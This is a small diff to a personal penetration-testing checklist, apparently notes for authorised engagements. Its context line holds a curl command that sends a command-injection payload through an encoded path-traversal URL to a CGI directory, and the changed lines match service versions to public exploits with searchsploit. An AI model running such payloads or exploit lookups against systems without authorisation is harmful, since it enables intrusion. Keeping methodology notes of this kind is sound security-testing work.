@@ -23,8 +23,8 @@ curl -s --path-as-is -d 'echo;id' '<Scheme>://<WebHost>/cgi-bin/.%2e/.%2e/.%2e/.
 - [ ] Every scanner finding confirmed like this before I count it
 
 ## Versions to exploits
-sudo nmap -sV -oX scan.xml <TargetIP>
-searchsploit --nmap scan.xml
+Every open port's version, from the deep scan in :Pb ports:
+searchsploit --nmap deep_tcp.xml
 searchsploit -m <EdbID>
 - [ ] Each exploit read before I run it, with its target version checked
 
